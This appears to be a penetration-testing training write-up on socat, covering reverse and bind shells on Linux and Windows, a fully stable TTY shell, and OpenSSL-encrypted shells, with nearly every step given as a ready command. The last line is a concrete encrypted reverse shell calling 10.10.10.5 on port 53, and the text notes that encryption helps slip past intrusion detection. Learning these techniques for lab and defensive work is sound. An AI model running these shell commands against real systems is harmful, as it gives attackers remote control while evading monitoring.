# socat

Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points -- much like the portal gun from the Portal games!

Once again, let's start with reverse shells.

Reverse Shells

As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:

socat TCP-L: -

As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to nc -lvnp .

On Windows we would use this command to connect back:

socat TCP:: EXEC:powershell.exe,pipes

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

This is the equivalent command for a Linux Target:

socat TCP:: EXEC:"bash -li"

Bind Shells

On a Linux target we would use the following command:

socat TCP-L: EXEC:"bash -li"

On a Windows target we would use this command for our listener:

socat TCP-L: EXEC:powershell.exe,pipes

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

socat TCP:: -

Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is significantly more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:

socat TCP-L: FILE:`tty`,raw,echo=0

Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the Ctrl + Z, stty raw -echo; fg trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.

The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.

The special command is as follows:

socat TCP:: EXEC:"bash -li",pty,stderr,sigint,setsid,sane

This is a handful, so let's break it down.

The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with EXEC:"bash -li". We're also passing the arguments: pty, stderr, sigint, setsid and sane:

pty, allocates a pseudoterminal on the target -- part of the stabilisation process stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells) sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell setsid, creates the process in a new session sane, stabilises the terminal, attempting to "normalise" it.

### Encrypted shells

One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.

We covered how to create basic shells in the previous task, so that syntax will not be covered again here. Suffice to say that any time TCP was used as part of a command, this should be replaced with OPENSSL when working with encrypted shells. We'll cover a few examples at the end of the task, but first let's talk about certificates.

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly. We then need to merge the two created files into a single .pem file:

cat shell.key shell.crt > shell.pem

Now, when we set up our reverse shell listener, we use:

socat OPENSSL-LISTEN:,cert=shell.pem,verify=0 -

This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

To connect back, we would use:

socat OPENSSL::,verify=0 EXEC:/bin/bash

The same technique would apply for a bind shell:

Target:

socat OPENSSL-LISTEN:,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

Attacker:

socat OPENSSL::,verify=0 -

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.

socat OPENSSL-LISTEN:53,cert=sencrypt.pem,verify=0 FILE:`tty`,raw,echo=0 socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
